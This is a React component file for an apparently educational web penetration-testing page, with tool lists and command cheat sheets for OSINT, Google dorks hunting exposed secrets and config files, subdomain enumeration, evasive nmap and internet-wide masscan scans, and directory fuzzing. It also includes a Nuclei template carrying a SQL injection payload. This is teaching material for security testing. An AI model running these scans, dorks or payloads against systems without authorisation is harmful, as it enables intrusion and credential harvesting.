
import React from 'react';
import { Search, Target, Shield, Zap, FileSearch, Code, Database, Lock, AlertTriangle, BookOpen, Terminal, Cloud, Smartphone, Globe, Bug, Eye } from 'lucide-react';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import CodeExample from '@/components/CodeExample';

const TestingTechniquesSection: React.FC = () => {
  return (
    <div className="space-y-8">
      <h2 className="section-title">Advanced Web Penetration Testing Techniques</h2>
      
      {/* Reconnaissance Techniques */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Search className="h-7 w-7 text-cybr-primary" />
          Reconnaissance & Intelligence Gathering
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="osint-comprehensive">
            <AccordionTrigger className="text-lg font-semibold">
              OSINT (Open Source Intelligence) - Complete Arsenal
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Essential OSINT Tools (25+ Tools)</h5>
                  <div className="space-y-4">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Search Engine Intelligence</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Google Dorking:</strong> Advanced search operators</li>
                        <li>• <strong>Shodan:</strong> Internet-connected device discovery</li>
                        <li>• <strong>Censys:</strong> Internet scanning and certificate analysis</li>
                        <li>• <strong>Fofa:</strong> Cyberspace search engine</li>
                        <li>• <strong>ZoomEye:</strong> Cyberspace search engine</li>
                        <li>• <strong>Binary Edge:</strong> Internet scanning platform</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Domain & DNS Intelligence</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>theHarvester:</strong> Email and subdomain harvesting</li>
                        <li>• <strong>Amass:</strong> Advanced attack surface mapping</li>
                        <li>• <strong>Subfinder:</strong> Passive subdomain discovery</li>
                        <li>• <strong>Assetfinder:</strong> Go-based subdomain enumeration</li>
                        <li>• <strong>DNSRecon:</strong> DNS enumeration and scanning</li>
                        <li>• <strong>Fierce:</strong> DNS reconnaissance tool</li>
                        <li>• <strong>DNS Dumpster:</strong> DNS recon service</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Social Media Intelligence</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Sherlock:</strong> Username enumeration across 300+ sites</li>
                        <li>• <strong>Social Mapper:</strong> Facial recognition OSINT</li>
                        <li>• <strong>Twint:</strong> Twitter intelligence tool</li>
                        <li>• <strong>Instaloader:</strong> Instagram OSINT</li>
                        <li>• <strong>Ghunt:</strong> Gmail OSINT investigations</li>
                        <li>• <strong>Maigret:</strong> Username OSINT collection</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced Google Dorking (100+ Examples)</h5>
                  <CodeExample
                    language="text"
                    title="Master Google Dorking Collection"
                    code={`# Administrative Interfaces
site:example.com inurl:admin
site:example.com inurl:administrator  
site:example.com inurl:login
site:example.com inurl:wp-admin
site:example.com inurl:phpmyadmin
site:example.com inurl:cpanel
site:example.com inurl:webmin
site:example.com intitle:"admin panel"
site:example.com intitle:"control panel"
site:example.com inurl:management

# Sensitive File Discovery
site:example.com filetype:xml | filetype:conf | filetype:cnf
site:example.com filetype:reg | filetype:inf | filetype:rdp
site:example.com ext:cfg | ext:env | ext:ini
site:example.com inurl:web.config
site:example.com inurl:.htaccess
site:example.com filetype:properties
site:example.com ext:yml | ext:yaml

# Database Exposure
site:example.com filetype:sql | filetype:dbf | filetype:mdb
site:example.com ext:db | ext:sqlite | ext:sqlite3
site:example.com inurl:backup
site:example.com inurl:dump
site:example.com "phpMyAdmin" "running on"
site:example.com inurl:adminer

# API Keys and Secrets
site:example.com "api_key" | "apikey" | "api-key"
site:example.com "secret_key" | "secretkey"
site:example.com "private_key" | "privatekey"
site:example.com "access_token" | "accesstoken"
site:example.com "aws_access_key_id"
site:example.com "client_secret"

# Version Information
site:example.com "powered by" | "built with" | "running"
site:example.com inurl:readme
site:example.com filetype:txt "version"
site:example.com intitle:"changelog"

# Development & Testing
site:example.com inurl:dev | inurl:development
site:example.com inurl:test | inurl:testing
site:example.com inurl:stage | inurl:staging
site:example.com inurl:beta
site:example.com subdomain:dev

# Directory Listings
site:example.com intitle:"index of"
site:example.com intitle:"directory listing"
site:example.com "parent directory"

# Error Messages & Debug Info
site:example.com "error" | "exception" | "warning"
site:example.com "stack trace" | "debug"
site:example.com "database error" | "mysql error"
site:example.com "php error" | "asp error"

# Backup Files
site:example.com ext:bak | ext:backup | ext:old | ext:orig
site:example.com inurl:backup
site:example.com filetype:tar | filetype:zip | filetype:rar

# Log Files
site:example.com filetype:log
site:example.com ext:log
site:example.com inurl:log
site:example.com "access.log" | "error.log"

# Cloud Storage
site:s3.amazonaws.com "example"
site:blob.core.windows.net "example"
site:storage.googleapis.com "example"`}
                  />
                </div>
              </div>
              
              <div className="mt-6">
                <h5 className="font-semibold mb-3 text-cybr-primary">Comprehensive Metadata Analysis</h5>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-yellow-400 mb-2">Document Analysis Tools</h6>
                    <ul className="text-sm space-y-1">
                      <li>• <strong>FOCA:</strong> Fingerprinting Organizations with Collected Archives</li>
                      <li>• <strong>Metagoofil:</strong> Metadata harvester</li>
                      <li>• <strong>ExifTool:</strong> Metadata reader/writer</li>
                      <li>• <strong>Document Analyzer:</strong> PDF metadata extraction</li>
                    </ul>
                  </div>
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-red-400 mb-2">Dark Web Intelligence</h6>
                    <ul className="text-sm space-y-1">
                      <li>• <strong>Tor Browser:</strong> Access .onion sites</li>
                      <li>• <strong>OnionScan:</strong> Dark web investigation</li>
                      <li>• <strong>DarkSearch:</strong> Dark web search engine</li>
                      <li>• <strong>Intelligence X:</strong> Dark web monitoring</li>
                    </ul>
                  </div>
                  <div className="p-3 bg-cybr-muted/30 rounded">
                    <h6 className="font-semibold text-cyan-400 mb-2">Breach Data Analysis</h6>
                    <ul className="text-sm space-y-1">
                      <li>• <strong>Have I Been Pwned API:</strong> Breach lookup</li>
                      <li>• <strong>DeHashed:</strong> Credential database</li>
                      <li>• <strong>Snusbase:</strong> Data breach search</li>
                      <li>• <strong>WeLeakInfo:</strong> Leaked database search</li>
                    </ul>
                  </div>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="subdomain-advanced">
            <AccordionTrigger className="text-lg font-semibold">
              Advanced Subdomain Enumeration & Asset Discovery
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Enumeration Techniques Comparison</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Passive Enumeration</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Certificate Transparency logs (crt.sh, Censys)</li>
                        <li>• DNS aggregators (SecurityTrails, PassiveTotal)</li>
                        <li>• Search engine discovery</li>
                        <li>• Archive analysis (Wayback Machine)</li>
                        <li>• Code repository mining (GitHub, GitLab)</li>
                        <li>• Public dataset analysis</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-red-900/20 border border-red-500 rounded">
                      <h6 className="font-semibold text-red-400 mb-2">Active Enumeration</h6>
                      <ul className="text-sm space-y-1">
                        <li>• DNS brute forcing with wordlists</li>
                        <li>• Zone transfer attempts (AXFR)</li>
                        <li>• DNS cache snooping</li>
                        <li>• Reverse DNS lookups</li>
                        <li>• Wildcard detection and filtering</li>
                        <li>• DNS over HTTPS (DoH) techniques</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Professional Tool Arsenal (20+ Tools)</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-blue-400">Amass:</strong> Advanced DNS enumeration with data source integration
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-green-400">Subfinder:</strong> High-speed passive discovery with API management
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-yellow-400">Assetfinder:</strong> Rapid asset discovery with minimal false positives
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-purple-400">Sublist3r:</strong> Multi-source enumeration with search engine integration
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-cyan-400">MassDNS:</strong> High-performance DNS resolver for large-scale enumeration
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Subdomain Enumeration Workflow"
                code={`# Comprehensive Passive Discovery
subfinder -d example.com -all -recursive -o passive_subs.txt
amass enum -passive -d example.com -src crtsh,hackertarget,virustotal -o amass_passive.txt

# Certificate Transparency Mining
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u > crt_subs.txt

# Active DNS Enumeration
amass enum -active -d example.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# DNS Brute Force with MassDNS
echo example.com | haktrails subdomains | massdns -r resolvers.txt -t A -o S

# Zone Transfer Attempts
dig axfr @ns1.example.com example.com
fierce -dns example.com

# Subdomain Takeover Detection
subjack -w subdomains.txt -t 100 -timeout 30 -o takeover.txt -ssl

# Visual Reconnaissance
aquatone-discover -d example.com
aquatone-scan -d example.com -ports 80,443,8080,8443
aquatone-gather -d example.com

# Continuous Monitoring Setup
amass track -config config.ini -d example.com
subfinder -d example.com -all | notify -discord

# Advanced Filtering and Validation
httpx -l subdomains.txt -status-code -tech-detect -title -o live_subs.txt
nuclei -l live_subs.txt -tags subdomain-takeover

# GitHub Repository Mining
github-subdomains -t <token> -d example.com
gitdorker -tf tokens.txt -q example.com -d dorking/

# DNS History Analysis
curl -s "https://securitytrails.com/list/apex_domain/example.com" -H "apikey: <key>"

# Wildcard Detection
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt example.com`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="tech-identification">
            <AccordionTrigger className="text-lg font-semibold">
              Technology Stack Fingerprinting & Analysis
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Comprehensive Detection Arsenal</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Automated Detection Tools</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>Wappalyzer:</strong> Browser extension with 1500+ technologies</li>
                        <li>• <strong>BuiltWith:</strong> Comprehensive technology profiler</li>
                        <li>• <strong>WhatWeb:</strong> Command-line fingerprinter with 1800+ plugins</li>
                        <li>• <strong>Webanalyze:</strong> Technology detection via Go</li>
                        <li>• <strong>Retire.js:</strong> JavaScript library vulnerability scanner</li>
                        <li>• <strong>Nuclei:</strong> Template-based technology detection</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">CMS-Specific Scanners</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>WPScan:</strong> WordPress security scanner</li>
                        <li>• <strong>Joomscan:</strong> Joomla vulnerability scanner</li>
                        <li>• <strong>DrupalScan:</strong> Drupal security assessment</li>
                        <li>• <strong>CMSeek:</strong> Multi-CMS detection and exploitation</li>
                        <li>• <strong>WhatCMS:</strong> CMS identification service</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Manual Fingerprinting Techniques</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-yellow-400 mb-2">Header Analysis</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Server signatures (Apache, Nginx, IIS)</li>
                        <li>• X-Powered-By headers</li>
                        <li>• Custom application headers</li>
                        <li>• Security headers presence</li>
                        <li>• Cookie analysis patterns</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Content Fingerprinting</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Error page signatures</li>
                        <li>• Default installation pages</li>
                        <li>• JavaScript framework detection</li>
                        <li>• CSS framework identification</li>
                        <li>• Favicon hash analysis</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Technology Detection Commands"
                code={`# Comprehensive Technology Detection
whatweb -v -a 3 https://example.com --color=never
httpx -u https://example.com -tech-detect -status-code -title -server

# JavaScript Framework Detection
curl -s https://example.com | grep -i "react\|angular\|vue\|jquery" 
retire --js --outputformat json --outputpath results.json https://example.com

# CMS Detection and Enumeration
cmseek -u https://example.com --batch --random-agent
wpscan --url https://example.com --enumerate ap,at,cb,dbe

# SSL/TLS Configuration Analysis
testssl.sh --parallel --protocols --server-defaults https://example.com
sslscan --show-certificate https://example.com

# HTTP Method and Security Testing
nmap --script http-methods,http-headers,http-security-headers https://example.com

# Custom Fingerprinting Scripts
curl -I https://example.com | grep -E "(Server|X-Powered-By|X-AspNet-Version|X-Framework)"

# Database Technology Detection
nmap -sV --script mysql-info,oracle-sid-brute,ms-sql-info example.com

# Cloud Provider Detection
dig example.com | grep -E "(amazonaws|azure|googlecloud|cloudflare)"

# CDN Detection
curl -I https://example.com | grep -i "cloudflare\|akamai\|fastly\|cloudfront"

# Technology Version Enumeration
nuclei -u https://example.com -tags tech,version-detect,cve

# Favicon Hash Fingerprinting
python3 favfreak.py -u https://example.com --hash

# Advanced Header Analysis
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -I https://example.com

# JavaScript Library Version Detection
python3 librarydetector.py -u https://example.com

# Port-based Service Detection
nmap -sV -sC -p- example.com | grep -E "http|https|ssl"`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="network-discovery">
            <AccordionTrigger className="text-lg font-semibold">
              Network Discovery & Port Scanning Mastery
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Scanning Techniques</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded text-sm">
                      <strong className="text-blue-400">TCP Connect Scan:</strong> Full three-way handshake (-sT)
                    </div>
                    <div className="p-2 bg-green-900/20 border border-green-500 rounded text-sm">
                      <strong className="text-green-400">SYN Stealth Scan:</strong> Half-open scanning (-sS)
                    </div>
                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded text-sm">
                      <strong className="text-yellow-400">UDP Scan:</strong> Connectionless protocol (-sU)
                    </div>
                    <div className="p-2 bg-purple-900/20 border border-purple-500 rounded text-sm">
                      <strong className="text-purple-400">ACK Scan:</strong> Firewall detection (-sA)
                    </div>
                    <div className="p-2 bg-red-900/20 border border-red-500 rounded text-sm">
                      <strong className="text-red-400">FIN/NULL/Xmas:</strong> Stealth techniques (-sF/-sN/-sX)
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Evasion Techniques</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-cyan-400">Fragmentation:</strong> Split packets (-f)
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-orange-400">Decoy Scanning:</strong> Spoof sources (-D)
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-pink-400">Timing Control:</strong> Speed adjustment (-T0 to -T5)
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-lime-400">Source Port:</strong> Port manipulation (--source-port)
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-violet-400">Data Length:</strong> Packet padding (--data-length)
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced Tools</h5>
                  <div className="space-y-2">
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-green-400">Masscan:</strong> High-speed Internet scanner
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-blue-400">Zmap:</strong> Internet-wide scanning tool
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-yellow-400">RustScan:</strong> Modern Rust-based scanner
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-purple-400">Unicornscan:</strong> Asynchronous scanner
                    </div>
                    <div className="p-2 bg-cybr-muted/20 rounded text-sm">
                      <strong className="text-red-400">Hping3:</strong> Custom packet crafting
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Master Port Scanning Techniques"
                code={`# Comprehensive Network Discovery
nmap -sn 192.168.1.0/24  # Host discovery
masscan -p1-65535 --rate=1000 10.0.0.0/8 --echo > masscan.conf

# Advanced TCP Scanning
nmap -sS -sV -O -A -T4 -p- --min-rate 1000 target.com
nmap -sC --script=default,vuln target.com -oA detailed_scan

# Stealth Scanning Techniques
nmap -sS -f -D RND:10 -T1 --source-port 53 target.com
nmap -sN -sF -sX --scan-delay 1s target.com

# UDP Service Discovery
nmap -sU --top-ports 1000 -T4 target.com
nmap -sU -p 53,67,68,69,123,135,137,138,139,161,162,445,500,514,520,631,998,1434,1701,1900,4500,5353 target.com

# Service Version Detection
nmap -sV --version-intensity 9 -p- target.com
nmap --script banner,ssh-hostkey,ssl-cert target.com

# Operating System Detection
nmap -O --osscan-guess --osscan-limit target.com
nmap --script smb-os-discovery target.com

# Firewall Detection & Bypass
nmap -sA -p 80,443,22,21,25,53,110,995,143,993,587,465 target.com
nmap --script firewall-bypass target.com

# High-Speed Scanning
masscan -p80,443 --rate=10000 0.0.0.0/0 --exclude 255.255.255.255
zmap -p 443 -o results.csv 10.0.0.0/8

# Custom Packet Crafting
hping3 -S -p 80 -c 1 target.com
hping3 -A -p 80 -c 1 target.com

# IPv6 Scanning
nmap -6 2001:db8::/32
nmap -6 --script ipv6-node-info target.com

# Service-Specific Scripts
nmap --script http-enum,http-headers,http-methods,http-robots.txt target.com
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle target.com

# Comprehensive Web Server Analysis
nmap -p 80,443,8080,8443 --script http-title,http-server-header,http-generator target.com

# Database Service Detection
nmap --script mysql-info,mysql-databases,mysql-users target.com
nmap --script oracle-sid-brute,oracle-enum-users target.com

# Network Topology Discovery
nmap --traceroute --script traceroute-geolocation target.com

# Continuous Monitoring
while true; do nmap -sS target.com | notify-send "Scan Complete"; sleep 3600; done`}
              />
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="content-discovery-advanced">
            <AccordionTrigger className="text-lg font-semibold">
              Advanced Content Discovery & Directory Enumeration
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Professional Discovery Tools</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-blue-400 mb-2">Fast Enumeration Tools</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>ffuf:</strong> Fast web fuzzer with advanced filtering</li>
                        <li>• <strong>Gobuster:</strong> Directory/file brute forcer in Go</li>
                        <li>• <strong>Feroxbuster:</strong> Rust-based recursive scanner</li>
                        <li>• <strong>Dirsearch:</strong> Advanced directory scanner</li>
                        <li>• <strong>Wfuzz:</strong> Web application fuzzer</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-green-400 mb-2">Specialized Discovery</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>LinkFinder:</strong> JavaScript endpoint discovery</li>
                        <li>• <strong>JSParser:</strong> JavaScript file analysis</li>
                        <li>• <strong>Secretfinder:</strong> Sensitive data in JS files</li>
                        <li>• <strong>GAU:</strong> Get All URLs from archives</li>
                        <li>• <strong>Waybackurls:</strong> Historical URL extraction</li>
                      </ul>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Advanced Wordlists & Payloads</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-yellow-400 mb-2">Premium Wordlist Collections</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>SecLists:</strong> Comprehensive security wordlists</li>
                        <li>• <strong>FuzzDB:</strong> Attack pattern database</li>
                        <li>• <strong>PayloadsAllTheThings:</strong> Community payloads</li>
                        <li>• <strong>Assetnote Wordlists:</strong> Bug bounty focused</li>
                        <li>• <strong>OneListForAll:</strong> Merged wordlist collection</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Custom Wordlist Generation</h6>
                      <ul className="text-sm space-y-1">
                        <li>• <strong>CeWL:</strong> Custom wordlist creator</li>
                        <li>• <strong>Crunch:</strong> Wordlist generator</li>
                        <li>• <strong>CUPP:</strong> Common User Password Profiler</li>
                        <li>• <strong>Mentalist:</strong> Graphical wordlist generator</li>
                        <li>• <strong>TTPassGen:</strong> Targeted wordlist generation</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Advanced Content Discovery Techniques"
                code={`# High-Performance Directory Enumeration
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://example.com/FUZZ -t 100 -mc 200,301,302,403 -fs 1234

# Multi-Extension Fuzzing
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,html,js,txt,bak

# API Endpoint Discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://example.com/api/FUZZ -mc 200,400,401,403,500

# Parameter Discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://example.com/page?FUZZ=test -fs 1234

# Backup File Hunting
feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x bak,backup,old,tmp,swp

# JavaScript Endpoint Extraction
python3 linkfinder.py -i https://example.com -o cli
cat subdomains.txt | gau | grep "\\.js$" | sort -u | tee js_files.txt

# Historical URL Mining
echo "example.com" | waybackurls | sort -u | tee wayback_urls.txt
gau example.com | sort -u | tee gau_urls.txt

# Sensitive File Discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/sensitive-files-unix.txt -u https://example.com/FUZZ

# Custom Wordlist Generation
cewl -d 2 -m 5 -w custom_wordlist.txt https://example.com
crunch 6 8 -t @@@@%% > custom_passwords.txt

# Advanced Filtering Techniques
ffuf -w wordlist.txt -u https://example.com/FUZZ -mc all -fc 404 -fs 0 -fr "not found"

# Recursive Directory Scanning
feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -r --depth 3

# File Upload Directory Discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/uploadable-extensions.txt -u https://example.com/uploads/test.FUZZ

# Configuration File Hunting
gobuster dir -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -x conf,config,cfg,ini,xml,yml,yaml

# GitHub Repository Mining
github-search -q "example.com" -t <token> | grep -E "\\.(php|js|py|rb|java)$"

# Social Media & Forum Discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/social-media.txt -u https://example.com/FUZZ

# Technology-Specific Discovery
# WordPress
wpscan --url https://example.com --enumerate ap,at,cb,dbe

# Drupal
droopescan scan drupal -u https://example.com

# Joomla
joomscan -u https://example.com

# Comprehensive Subdirectory Analysis
for sub in $(cat subdomains.txt); do
  ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://$sub/FUZZ -mc 200,301,302,403 -o $sub.json
done`}
              />
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>

      {/* Vulnerability Assessment */}
      <div className="card">
        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <Shield className="h-7 w-7 text-cybr-primary" />
          Advanced Vulnerability Assessment & Scanning
        </h3>
        
        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem value="automated-scanning-pro">
            <AccordionTrigger className="text-lg font-semibold">
              Professional Automated Scanning Arsenal
            </AccordionTrigger>
            <AccordionContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Enterprise Scanner Comparison</h5>
                  <div className="space-y-4">
                    <div className="p-4 bg-gradient-to-r from-blue-900/20 to-cyan-900/20 border border-blue-500 rounded-lg">
                      <h6 className="font-semibold text-blue-400 mb-2">Burp Suite Professional ($399/year)</h6>
                      <div className="text-sm space-y-1">
                        <div className="text-green-400">✓ Advanced scanner with custom checks</div>
                        <div className="text-green-400">✓ Burp Collaborator for out-of-band testing</div>
                        <div className="text-green-400">✓ Unlimited Intruder payloads</div>
                        <div className="text-green-400">✓ Extensions ecosystem (BApp Store)</div>
                        <div className="text-green-400">✓ Mobile Assistant for mobile testing</div>
                        <div className="text-red-400">✗ Single-user license</div>
                        <div className="text-red-400">✗ Learning curve for beginners</div>
                      </div>
                    </div>
                    
                    <div className="p-4 bg-gradient-to-r from-green-900/20 to-emerald-900/20 border border-green-500 rounded-lg">
                      <h6 className="font-semibold text-green-400 mb-2">OWASP ZAP (Free)</h6>
                      <div className="text-sm space-y-1">
                        <div className="text-green-400">✓ Completely free and open source</div>
                        <div className="text-green-400">✓ Active and passive scanning modes</div>
                        <div className="text-green-400">✓ REST API for automation</div>
                        <div className="text-green-400">✓ Docker support for CI/CD</div>
                        <div className="text-green-400">✓ Authentication support</div>
                        <div className="text-yellow-400">~ Complex UI for beginners</div>
                        <div className="text-yellow-400">~ Performance issues with large apps</div>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h5 className="font-semibold mb-3 text-cybr-primary">Commercial Scanner Analysis</h5>
                  <div className="space-y-3">
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-purple-400 mb-2">Acunetix ($4,500+/year)</h6>
                      <ul className="text-sm space-y-1">
                        <li>• High accuracy with minimal false positives</li>
                        <li>• Modern web app support (SPAs, APIs)</li>
                        <li>• DeepScan technology for complex apps</li>
                        <li>• Comprehensive reporting capabilities</li>
                        <li>• Integration with issue trackers</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-orange-400 mb-2">Rapid7 InsightAppSec ($12,000+/year)</h6>
                      <ul className="text-sm space-y-1">
                        <li>• DevSecOps integration capabilities</li>
                        <li>• Attack replay functionality</li>
                        <li>• Dynamic verification of findings</li>
                        <li>• Executive dashboards and reporting</li>
                        <li>• API security testing focus</li>
                      </ul>
                    </div>
                    
                    <div className="p-3 bg-cybr-muted/30 rounded">
                      <h6 className="font-semibold text-cyan-400 mb-2">Invicti (Netsparker) ($8,000+/year)</h6>
                      <ul className="text-sm space-y-1">
                        <li>• Proof-based scanning technology</li>
                        <li>• False positive reduction</li>
                        <li>• Enterprise scalability</li>
                        <li>• Compliance reporting capabilities</li>
                        <li>• Advanced authentication support</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
              
              <CodeExample
                language="bash"
                title="Professional Scanner Configuration & Usage"
                code={`# OWASP ZAP Automated Scanning
# Docker-based scanning for CI/CD
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py -t https://example.com -r baseline_report.html

# Advanced ZAP scanning with authentication
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t https://example.com -r full_report.html -a

# ZAP API automation
python3 -c "
from zapv2 import ZAPv2
zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
zap.urlopen('https://example.com')
zap.spider.scan('https://example.com')
zap.ascan.scan('https://example.com')
print(zap.core.htmlreport())
"

# Nuclei Template-based Scanning
nuclei -u https://example.com -tags cve,misconfig,xss,sqli -o nuclei_results.txt
nuclei -l urls.txt -t /root/nuclei-templates/ -severity high,critical -o critical_findings.txt

# Custom Nuclei template creation
cat > custom-check.yaml << 'EOF'
id: custom-sql-injection
info:
  name: Custom SQL Injection Test
  author: security-team
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}/search?q=test'OR'1'='1"
    matchers:
      - type: word
        words:
          - "mysql error"
          - "syntax error"
        condition: or
EOF

# Nikto Web Server Scanner
nikto -h https://example.com -Format htm -output nikto_report.html
nikto -h https://example.com -Plugins @@ALL -ask no

# W3af Framework Usage
w3af_console -s scripts/web_spider.w3af
w3af_console -s scripts/full_audit.w3af

# Arachni Scanner
